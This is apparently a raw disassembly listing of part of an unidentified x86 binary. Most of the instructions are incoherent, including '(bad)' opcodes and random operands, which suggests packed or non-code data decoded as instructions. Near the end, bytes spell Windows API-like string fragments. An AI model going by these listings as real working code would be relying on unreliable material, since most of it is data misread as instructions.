  41fa48:	cmp    al,0xfc
  41fa4a:	or     BYTE PTR [ecx+ebp*2-0x79],bl
  41fa4e:	mov    edx,0xc867e9f
  41fa53:	js     0x41f9f5
  41fa55:	movzx  ebx,bp
  41fa58:	mov    ?,WORD PTR [eax-0x65]
  41fa5b:	add    dh,dl
  41fa5d:	jl     0x41fa15
  41fa5f:	sub    ebx,DWORD PTR [edx-0x6d8fbc57]
  41fa65:	mov    ecx,0xbf18300e
  41fa6a:	in     al,dx
  41fa6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa6c:	and    dh,dl
  41fa6e:	sub    ecx,ebp
  41fa70:	cmp    BYTE PTR [eax+eiz*8+0x64],al
  41fa74:	stos   BYTE PTR es:[edi],al
  41fa75:	and    eax,0xf0b144ea
  41fa7a:	mov    bl,bh
  41fa7c:	pop    edi
  41fa7d:	xor    dh,BYTE PTR [edi+0x4e68a410]
  41fa83:	mov    ecx,0x1a16015f
  41fa88:	push   ecx
  41fa89:	aad    0xee
  41fa8b:	mov    ebx,0x1684d90d
  41fa90:	ja     0x41fa4f
  41fa92:	sub    DWORD PTR [edi],ebx
  41fa94:	stos   BYTE PTR es:[edi],al
  41fa95:	aad    0xf8
  41fa97:	mov    edi,0xb68f2c72
  41fa9c:	(bad)  
  41fa9d:	sbb    ah,ch
  41fa9f:	xor    ah,BYTE PTR [ecx]
  41faa1:	or     eax,0x4253735f
  41faa6:	ja     0x41fa70
  41faa8:	popa   
  41faa9:	lock popa 
  41faab:	xchg   edi,eax
  41faac:	ret    0x276a
  41faaf:	add    bh,BYTE PTR [ebx]
  41fab1:	mov    bl,BYTE PTR ds:0xc17563db
  41fab7:	or     bh,BYTE PTR [edi]
  41fab9:	mov    ah,BYTE PTR [eax]
  41fabb:	xchg   esp,eax
  41fabc:	push   ds
  41fabd:	repnz mov BYTE PTR [eax],0x0
  41fac1:	(bad)  
  41fac3:	pop    es
  41fac4:	jmp    0x41fb24
  41fac6:	push   0x11ef37c9
  41facb:	(bad)  [ebx+0x817b]
	...
  41fad9:	add    BYTE PTR [eax],al
  41fadb:	outs   dx,DWORD PTR ds:[esi]
  41fadc:	mov    ds:0x7edd2ad4,al
  41fae1:	jmp    edi
  41fae3:	push   edx
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0xef
  41fae8:	mov    bl,0xc
  41faea:	jg     0x41fadf
  41faec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faed:	add    DWORD PTR [eax],eax
  41faef:	lods   al,BYTE PTR ds:[esi]
  41faf0:	add    BYTE PTR [eax],al
  41faf2:	add    cl,dl
  41faf4:	rcl    dh,cl
  41faf6:	push   ebx
  41faf7:	push   ecx
  41faf8:	(bad)  
  41faf9:	sbb    BYTE PTR [edi],ah
  41fafb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fafc:	inc    edx
  41fafd:	test   al,0xc4
  41faff:	(bad)  
  41fb00:	cli    
  41fb01:	and    esp,DWORD PTR [edi-0x58]
  41fb04:	dec    edx
  41fb05:	xchg   esp,eax
  41fb06:	stos   DWORD PTR es:[edi],eax
  41fb07:	xchg   edx,eax
  41fb08:	xlat   BYTE PTR ds:[ebx]
  41fb09:	outs   dx,DWORD PTR ds:[esi]
  41fb0a:	sub    eax,0x46d161d3
  41fb0f:	inc    esi
  41fb10:	iret   
  41fb11:	retf   0xa116
  41fb14:	addr16 data16 (bad) 
  41fb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb18:	xor    BYTE PTR [edx+0x1e],ch
  41fb1b:	in     al,dx
  41fb1c:	mov    ss,WORD PTR [esi]
  41fb1e:	imul   dl
  41fb20:	or     DWORD PTR [ecx+ebx*4],edi
  41fb23:	out    dx,eax
  41fb24:	sbb    al,0x9f
  41fb26:	cmp    ah,BYTE PTR [eax]
  41fb28:	sub    eax,0x1896596e
  41fb2d:	xor    DWORD PTR [edx],0xcbbc19f
  41fb33:	out    dx,eax
  41fb34:	dec    edx
  41fb35:	unpckhps xmm0,XMMWORD PTR ds:0xad8bf2a6
  41fb3c:	setno  BYTE PTR [eax+0x22b27248]
  41fb43:	mov    esp,0x9b2a1799
  41fb48:	out    dx,al
  41fb49:	inc    ebx
  41fb4a:	mov    edi,ss
  41fb4c:	jmp    0x5abc:0x8405bd6a
  41fb53:	sbb    WORD PTR [eax+edx*8+0x27a20247],bp
  41fb5b:	jb     0x41fba1
  41fb5d:	sbb    dl,BYTE PTR [edi-0x3eaad908]
  41fb63:	mov    bh,BYTE PTR [esi-0x34]
  41fb66:	adc    al,0xf
  41fb68:	pop    edi
  41fb69:	jle    0x41fb6a
  41fb6b:	in     eax,0x77
  41fb6d:	nop
  41fb6e:	mov    esi,0xcfcb7c76
  41fb73:	je     0x41fb24
  41fb75:	xlat   BYTE PTR ds:[ebx]
  41fb76:	fxch   st(2)
  41fb78:	inc    edx
  41fb79:	dec    edx
  41fb7a:	inc    ecx
  41fb7b:	nop
  41fb7c:	mov    esi,0x868fd711
  41fb81:	out    dx,al
  41fb82:	mov    esp,0xd0c20671
  41fb87:	call   DWORD PTR [ebx-0x684aefb4]
  41fb8d:	mov    eax,ds:0xf9016cf7
  41fb92:	pop    edx
  41fb93:	sub    DWORD PTR [ecx-0xe],0xffffff94
  41fb97:	mul    DWORD PTR [ecx+0x78]
  41fb9a:	pop    es
  41fb9b:	adc    BYTE PTR [ebx-0x42],al
  41fb9e:	mov    BYTE PTR [eax],0x0
	...
  41fba9:	add    BYTE PTR [eax],al
  41fbab:	stc    
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	adc    ah,ah
  41fbb9:	pop    ebp
  41fbba:	clc    
  41fbbb:	lahf   
  41fbbc:	test   al,0x1
  41fbbe:	add    BYTE PTR [eax+eax*1-0x2d00000],ch
  41fbc5:	ret    
  41fbc6:	in     al,dx
  41fbc7:	jmp    0x41fbdd
  41fbc9:	inc    ecx
  41fbca:	in     al,dx
  41fbcb:	xor    ebx,DWORD PTR [edi+0x2788b7bb]
  41fbd1:	in     al,dx
  41fbd2:	mov    DWORD PTR [ebp+0x4c],edx
  41fbd5:	xor    eax,0xd3987276
  41fbda:	jnp    0x41fc25
  41fbdc:	fs inc esi
  41fbde:	ds es js 0x41fc5a
  41fbe2:	adc    BYTE PTR [ecx+0x18],al
  41fbe5:	dec    ebx
  41fbe6:	into   
  41fbe7:	jb     0x41fbbe
  41fbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbea:	cli    
  41fbeb:	jae    0x41fb6e
  41fbed:	shl    ch,1
  41fbef:	loop   0x41fb94
  41fbf1:	adc    eax,0x2f977997
  41fbf6:	sbb    eax,0x865920dc
  41fbfb:	jb     0x41fb94
  41fbfd:	push   ss
  41fbfe:	fadd   QWORD PTR [edx]
  41fc00:	and    eax,0xef2456e2
  41fc05:	add    dl,BYTE PTR [ecx]
  41fc07:	iret   
  41fc08:	repz daa 
  41fc0a:	in     al,0xdf
  41fc0c:	call   0xc1c6:0x2fd09ed9
  41fc13:	or     ah,BYTE PTR [edx+0x59]
  41fc16:	sbb    BYTE PTR [eax-0x59],bl
  41fc19:	mov    bl,BYTE PTR [esi]
  41fc1b:	out    0xcc,eax
  41fc1d:	pop    esi
  41fc1e:	push   ebx
  41fc1f:	loop   0x41fbcb
  41fc21:	jae    0x41fc72
  41fc23:	add    dh,BYTE PTR [ebp-0x3f450395]
  41fc29:	test   ecx,esi
  41fc2b:	test   al,0x96
  41fc2d:	leave  
  41fc2e:	mov    esp,0xfded2d66
  41fc33:	stc    
  41fc34:	repz mov WORD PTR [ebp-0x41],ds
  41fc38:	popa   
  41fc39:	sbb    eax,eax
  41fc3b:	cmp    eax,0x6f32153d
  41fc40:	mov    ds:0x28d59fa3,eax
  41fc45:	cmp    eax,0xc73e70c4
  41fc4a:	ret    0x3db5
  41fc4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4e:	xchg   ebx,eax
  41fc4f:	ret    
  41fc50:	addr16 dec ebp
  41fc52:	dec    esi
  41fc53:	dec    eax
  41fc54:	mov    BYTE PTR [edi],0x70
  41fc57:	push   eax
  41fc58:	lahf   
  41fc59:	fdivp  st(4),st
  41fc5b:	(bad)  
  41fc5c:	push   0xf89c803d
  41fc61:	add    edx,ecx
  41fc63:	ins    BYTE PTR es:[edi],dx
  41fc64:	loopne 0x41fcb8
  41fc66:	xlat   BYTE PTR ds:[ebx]
  41fc67:	test   eax,0xf17b1954
  41fc6c:	adc    eax,0x3b17
	...
  41fc79:	add    BYTE PTR [eax],al
  41fc7b:	mov    eax,ds:0x3e8336b9
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x79948c27
  41fc89:	dec    edi
  41fc8a:	dec    ebp
  41fc8b:	dec    ebx
  41fc8c:	test   eax,0xac0001
  41fc91:	add    BYTE PTR [eax],al
  41fc93:	or     ah,BYTE PTR [eax+0x484207d5]
  41fc99:	pop    edx
  41fc9a:	push   0x752c23e6
  41fc9f:	cmp    eax,0x26e9e632
  41fca4:	fs (bad) 
  41fca6:	push   0xa15efa56
  41fcab:	mov    bh,BYTE PTR ds:[edx+0x6602ba93]
  41fcb2:	jle    0x41fd09
  41fcb4:	xchg   ebx,eax
  41fcb5:	fst    QWORD PTR [ebx-0x72]
  41fcb8:	(bad)  
  41fcb9:	mov    dh,0xa3
  41fcbb:	test   BYTE PTR [ecx+0xd990d55],dh
  41fcc1:	mov    bl,0x54
  41fcc3:	push   eax
  41fcc4:	stos   DWORD PTR es:[edi],eax
  41fcc5:	add    BYTE PTR [eax-0x30418b8d],dh
  41fccb:	mov    esi,DWORD PTR [eax]
  41fccd:	jl     0x41fcde
  41fccf:	outs   dx,BYTE PTR ds:[esi]
  41fcd0:	int3   
  41fcd1:	shl    BYTE PTR [esi],0xca
  41fcd4:	dec    edi
  41fcd5:	sbb    esi,ebx
  41fcd7:	mul    BYTE PTR [ecx]
  41fcd9:	sub    al,0xbc
  41fcdb:	fdiv   DWORD PTR [esi+eax*2-0x64]
  41fcdf:	push   edx
  41fce0:	jo     0x41fcc9
  41fce2:	or     BYTE PTR [ebp+0x13],cl
  41fce5:	pop    ebp
  41fce6:	xor    eax,0x5d2a3848
  41fceb:	(bad)  
  41fcec:	cmp    esi,DWORD PTR [edx]
  41fcee:	aam    0x48
  41fcf0:	push   ecx
  41fcf1:	xor    BYTE PTR [ecx-0x44],bl
  41fcf4:	inc    esp
  41fcf5:	mov    ch,0xf1
  41fcf7:	test   DWORD PTR [esi],edi
  41fcf9:	(bad)  
  41fcfa:	faddp  st(4),st
  41fcfc:	dec    ebp
  41fcfd:	data16 xor dh,ah
  41fd00:	adc    BYTE PTR [ebp+0x5e],bh
  41fd03:	mov    ?,edi
  41fd05:	or     eax,0xc0967f04
  41fd0a:	lahf   
  41fd0b:	pop    es
  41fd0c:	xchg   edi,eax
  41fd0d:	clc    
  41fd0e:	pop    esp
  41fd0f:	mov    edi,0x25df6c4b
  41fd14:	lea    ecx,gs:[ecx+0x78f0cfb1]
  41fd1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd1c:	imul   BYTE PTR [edx+0x2b5554d8]
  41fd22:	rcl    BYTE PTR [edi+0x9],1
  41fd25:	mov    ebp,0xaab74b12
  41fd2a:	push   ecx
  41fd2b:	and    ecx,DWORD PTR [edx+edx*4-0x6a]
  41fd2f:	jo     0x41fcbf
  41fd31:	jne    0x41fd6b
  41fd33:	pop    ebp
  41fd34:	stos   DWORD PTR es:[edi],eax
  41fd35:	xlat   BYTE PTR ds:[ebx]
  41fd36:	je     0x41fd3f
  41fd38:	call   0x7c9d:0x5d085586
	...
  41fd4b:	adc    dl,bh
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	out    dx,al
  41fd58:	pusha  
  41fd59:	sub    esi,0x1a9f7
  41fd5f:	lods   al,BYTE PTR ds:[esi]
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    BYTE PTR [eax],bl
  41fd64:	jb     0x41fd3e
  41fd66:	pushf  
  41fd67:	jne    0x41fdcf
  41fd69:	push   esi
  41fd6a:	daa    
  41fd6b:	cmc    
  41fd6c:	das    
  41fd6d:	out    0x55,al
  41fd6f:	out    0xc9,al
  41fd71:	jb     0x41fdc0
  41fd73:	arpl   WORD PTR [esi-0x48101cb9],si
  41fd79:	inc    edx
  41fd7a:	int3   
  41fd7b:	sti    
  41fd7c:	mov    eax,0xf76511c0
  41fd81:	lds    edi,FWORD PTR [ebp+0xb]
  41fd84:	jno    0x41fdf7
  41fd86:	mov    gs,WORD PTR ds:0x24ccd80f
  41fd8c:	sub    eax,esp
  41fd8e:	stos   BYTE PTR es:[edi],al
  41fd8f:	xchg   ch,ah
  41fd91:	fst    QWORD PTR ds:0x2c2f7122
  41fd97:	bsr    ebx,edx
  41fd9a:	test   DWORD PTR [ebp+0x51],edi
  41fd9d:	mov    bh,0x34
  41fd9f:	sub    edi,DWORD PTR [esi]
  41fda1:	jbe    0x41fd8f
  41fda3:	test   al,0x92
  41fda5:	jg     0x41fdfe
  41fda7:	push   ss
  41fda8:	mov    esi,0x8e6b0a23
  41fdad:	pop    ecx
  41fdae:	jns    0x41fe28
  41fdb0:	jno    0x41fd7b
  41fdb2:	adc    BYTE PTR [edx+0x52fdf192],ch
  41fdb8:	cvtdq2ps xmm1,XMMWORD PTR [esi-0x37]
  41fdbc:	push   0x41
  41fdbe:	mov    dh,0x53
  41fdc0:	pop    es
  41fdc1:	and    edi,DWORD PTR [edx+0xe]
  41fdc4:	test   DWORD PTR [ecx-0x17],eax
  41fdc7:	jl     0x41fd49
  41fdc9:	ret    
  41fdca:	cli    
  41fdcb:	scas   eax,DWORD PTR es:[edi]
  41fdcc:	mov    bh,0x93
  41fdce:	adc    bl,BYTE PTR [esi]
  41fdd0:	dec    edi
  41fdd1:	dec    ebx
  41fdd2:	popf   
  41fdd3:	xor    eax,0x34df5a0e
  41fdd8:	dec    ebp
  41fdd9:	adc    BYTE PTR [ecx+0x179d3ac5],ch
  41fddf:	inc    ecx
  41fde0:	aam    0xfb
  41fde2:	fstp   DWORD PTR [edi+0x51]
  41fde5:	das    
  41fde6:	int    0xeb
  41fde8:	ret    
  41fde9:	inc    esp
  41fdea:	pop    ecx
  41fdeb:	in     eax,0x1c
  41fded:	lods   eax,DWORD PTR ds:[esi]
  41fdee:	lahf   
  41fdef:	ds cs stos DWORD PTR es:[edi],eax
  41fdf2:	cli    
  41fdf3:	push   edx
  41fdf4:	(bad)  
  41fdf5:	sti    
  41fdf6:	popa   
  41fdf7:	pop    ecx
  41fdf8:	pop    edi
  41fdf9:	in     al,0x90
  41fdfb:	es sti 
  41fdfd:	jmp    0x41fe54
  41fdff:	outs   dx,BYTE PTR ds:[esi]
  41fe00:	dec    DWORD PTR [ecx-0x78]
  41fe03:	inc    ebp
  41fe04:	sub    bh,BYTE PTR [edx-0x1db969b]
  41fe0a:	mov    eax,ds:0x4582cc29
	...
  41fe1b:	adc    bh,BYTE PTR [edx-0x19073928]
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	xchg   ebp,eax
  41fe28:	pushf  
  41fe29:	mov    bh,0xb0
  41fe2b:	mov    ds:0xac0001aa,eax
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    BYTE PTR [edx+0x61d942ab],ch
  41fe38:	pop    ss
  41fe39:	mov    eax,0xe7163486
  41fe3e:	iret   
  41fe3f:	call   0xf9a:0xe9323329
  41fe46:	dec    ebx
  41fe47:	ret    
  41fe48:	dec    ebx
  41fe49:	addr16 loopne 0x41fdf5
  41fe4c:	pop    edi
  41fe4d:	mov    ebx,0x84c7ad79
  41fe52:	mov    eax,ds:0x895a24fb
  41fe57:	dec    ebx
  41fe58:	aad    0xf5
  41fe5a:	cld    
  41fe5b:	hlt    
  41fe5c:	and    eax,0x80bbc113
  41fe62:	in     al,dx
  41fe63:	in     eax,0x87
  41fe65:	cmp    bh,dl
  41fe67:	cld    
  41fe68:	sbb    al,0x82
  41fe6a:	add    al,0x73
  41fe6c:	bound  eax,QWORD PTR [ecx-0x96072f3]
  41fe72:	int3   
  41fe73:	add    edx,esi
  41fe75:	test   DWORD PTR [ecx+eiz*4+0x45e643f0],eax
  41fe7c:	cmc    
  41fe7d:	dec    ebx
  41fe7e:	shl    DWORD PTR [ebx-0x545ca879],1
  41fe84:	(bad)  [esi+eax*4-0x3663806]
  41fe8b:	or     al,0xaa
  41fe8d:	jno    0x41feaa
  41fe8f:	cmc    
  41fe90:	xlat   BYTE PTR ds:[ebx]
  41fe91:	enter  0x2cf1,0x7
  41fe95:	mov    WORD PTR [ebx+0x168c71b7],?
  41fe9b:	int    0x6d
  41fe9d:	fucomp st(3)
  41fe9f:	lahf   
  41fea0:	or     dl,bl
  41fea2:	out    0x54,eax
  41fea4:	jb     0x41fe55
  41fea6:	or     BYTE PTR [edx-0x5a],bh
  41fea9:	nop
  41feaa:	xor    dh,bh
  41feac:	test   al,0x65
  41feae:	aad    0x5b
  41feb0:	popa   
  41feb1:	ficom  DWORD PTR [esi-0x47]
  41feb4:	js     0x41feef
  41feb6:	mov    cl,0x80
  41feb8:	dec    edi
  41feb9:	and    cl,ah
  41febb:	lock adc dh,BYTE PTR [ebx+0x3c98095e]
  41fec2:	push   ds
  41fec3:	jbe    0x41fee3
  41fec5:	jns    0x41fe4e
  41fec7:	xor    edi,esi
  41fec9:	adc    BYTE PTR [ebp-0x13],bl
  41fecc:	push   ebx
  41fecd:	lods   al,BYTE PTR ds:[esi]
  41fece:	and    esi,DWORD PTR [ecx-0x21ab4513]
  41fed4:	mov    ecx,0x1fbd4526
  41fed9:	adc    eax,0xe815726e
  41fede:	push   ebx
	...
  41feeb:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
